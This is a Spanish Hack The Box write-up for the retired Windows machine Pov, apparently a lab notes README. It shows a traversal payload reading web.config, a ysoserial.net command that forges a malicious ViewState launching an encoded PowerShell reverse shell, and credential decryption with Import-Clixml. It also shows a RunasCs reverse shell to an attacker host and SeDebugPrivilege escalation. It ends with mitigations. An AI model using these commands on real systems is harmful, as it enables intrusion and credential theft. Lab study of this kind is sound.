---
machine: Pov
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, iis, aspnet, viewstate, ysoserial, credential, sedebugprivilege, privesc]
---

# Pov — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La web ASP.NET permite leer archivos y recorrer directorios; se obtiene `web.config` con las claves `machineKey`. Con `ysoserial.net` se firma un ViewState malicioso y se ejecuta código como `sfitz`. Un archivo `connection.xml` de PowerShell contiene la credencial de `alaading`, y `SeDebugPrivilege` permite inyectar en un proceso de SYSTEM y llegar a Administrator.

## Reconocimiento

```bash
nmap -Pn -sCV -p80 <IP>
```

- Solo `80` con IIS y una web de portfolio ASP.NET.
- `ffuf` encuentra `pov.htb` y el correo `sfitz@pov.htb`.
- La aplicación usa `__VIEWSTATE` y devuelve errores detallados.

## Enumeración

- Un parámetro de descarga permite leer archivos y recorrer directorios.
- Se lee `web.config` un nivel por encima del directorio del portfolio.
- Contiene `machineKey` con `decryptionKey` y `validationKey`.

```text
?file=..%2fweb.config
```

## Foothold

`ysoserial.net` genera un ViewState con el gadget `WindowsIdentity`, las claves y la ruta `/portfolio`. Se envía en `__VIEWSTATE` y se ejecuta una reverse shell como `pov\sfitz`.

```powershell
ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg=AES \
  --decryptionkey=<KEY> --validationalg=SHA1 --validationkey=<KEY> \
  --path=/portfolio -c "powershell -e <BASE64>"
```

## Movimiento lateral

En `C:\Users\sfitz\Documents\connection.xml` hay un `PSCredential` de `alaading`. Se importa con `Import-Clixml` y se usa `RunasCs` para obtener su shell.

```powershell
$cred = Import-Clixml .\connection.xml
$cred.GetNetworkCredential().Password
.\RunasCs.exe alaading <PASS> cmd.exe -r <ATTACKER>:444
```

## Escalada de privilegios

`alaading` tiene `SeDebugPrivilege`. Se puede migrar a un proceso de SYSTEM con Meterpreter o usar `psgetsys.ps1` para duplicar el token de `winlogon` y obtener SYSTEM; después se accede al escritorio de Administrator.

```powershell
.\psgetsys.ps1
```

## Evidencia

- File read y traversal.
- `web.config` con `machineKey`.
- ViewState malicioso y `sfitz`.
- `connection.xml` y `alaading`.
- `SeDebugPrivilege` y Administrator.

## Lecciones aprendidas

- Un file read en ASP.NET puede exponer `machineKey`.
- ViewState sin claves rotadas es deserialización explotable.
- Los archivos de credenciales de PowerShell son secretos.
- `SeDebugPrivilege` equivale a SYSTEM.

## Mitigación y detección

- Validar rutas y no permitir traversal.
- Rotar `machineKey` y habilitar `ViewStateMac`.
- No guardar `PSCredential` en carpetas de usuario.
- Restringir `SeDebugPrivilege` y auditar su uso.

## Referencias

- [0xdf — Pov](https://0xdf.gitlab.io/2024/06/08/htb-pov.html)
- [IppSec — Pov](https://www.youtube.com/watch?v=84xCsHvkxYE)
- [Hack The Box — Pov](https://app.hackthebox.com/machines/pov)
